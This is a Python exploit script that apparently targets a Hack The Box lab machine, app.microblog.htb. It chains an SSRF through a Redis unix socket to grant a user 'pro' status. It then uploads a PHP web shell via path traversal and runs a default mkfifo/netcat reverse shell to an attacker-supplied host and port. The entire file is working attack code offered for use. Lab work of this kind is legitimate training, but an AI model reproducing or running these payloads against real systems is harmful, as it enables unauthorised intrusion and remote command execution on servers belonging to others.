#!/usr/bin/env python3
from readFile import registerUser, loginUser, createBlog
from requests import request, exceptions, Session
from argparse import ArgumentParser
from urllib.parse import quote, quote_plus
from uuid import uuid4

def getArguments():
    parser = ArgumentParser(description="SSRF & File Upload Exploit for app.microblog.htb")
    parser.add_argument("-c", "--command", required=False, help="Command executed instead of the default reverse shell")
    parser.add_argument("-l", "--lhost", required=True, help="The listening host")
    parser.add_argument("-p", "--port", required=True, type=int, help="The listening port")
    return parser.parse_args()

def makeUserPro(user: dict) -> None:
    username = user["username"]
    redisSocket = f"/var/run/redis/redis.sock"
    redisSocketEncoded = quote_plus(redisSocket)
    redisHsetArgs = f"{username} pro true "
    redisHsetArgsEncoded = quote(redisHsetArgs)

    httpMethod = "HSET"
    try:
        request(httpMethod, f"http://microblog.htb/static/unix:{redisSocketEncoded}:{redisHsetArgsEncoded}/foo", timeout=2)
        # First line of HTTP Request will be: HSET {username} pro true microblog.htb/foo HTTP/1.1
    except exceptions.ReadTimeout:
        print("[ERROR] The request making the user a pro user timed out")
        exit(1)
    except exceptions.ConnectionError:
        print("[ERROR] Could not connect to microblog.htb to make the user a pro user")
        exit(1)

def uploadPhpFile(session: Session, blogName: str) -> str:
    postToBlogHeaders = {"Host": f"{blogName}.microblog.htb", "Content-Type": "application/x-www-form-urlencoded"}
    phpFilename = uuid4().hex + ".php"
    phpFile = {"id": f"../uploads/{phpFilename}", "txt": "<?php system($_GET['cmd']) ?>"}
    try:
        session.post("http://app.microblog.htb/edit/index.php", headers=postToBlogHeaders, data=phpFile, allow_redirects=False, timeout=3)
    except exceptions.ReadTimeout:
        print("[ERROR] The request uploading a php file to blog timed out")
        exit(1)
    except exceptions.ConnectionError:
        print("[ERROR] Could not connect to app.microblog.htb to upload a php file")
        exit(1)
    return phpFilename

def executeCommand(session: Session, blogName: str, fileName: str, command: str) -> str:
    commandParam = {"cmd": command}
    hostHeader = {"Host": f"{blogName}.microblog.htb"}
    try:
        response = session.get(f"http://app.microblog.htb/uploads/{fileName}", headers=hostHeader, params=commandParam, timeout=4)
        return response.text
    except exceptions.ReadTimeout:
        print("[WARN] The request executing the command timed out.\nIt might be because you received the reverse shell.")
    except exceptions.ConnectionError:
        print("[ERROR] Could not connect to app.microblog.htb to execute the command")

def main():
    args = getArguments()
    print("Registering user..")
    user = registerUser()
    print("Logging-in..")
    session = loginUser(user)
    print("Making user a pro user..")
    makeUserPro(user)
    print("Creating blog..")
    blogName = createBlog(session)
    print("Uploading php file..")
    filename = uploadPhpFile(session, blogName)

    command = args.command if args.command != None else f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.lhost} {args.port} >/tmp/f"
    print("Executing command..")
    result = executeCommand(session, blogName, filename, command)
    if result != None:
        print(result[25:-6]) # Deletes the added html

if __name__ == "__main__":
    main()
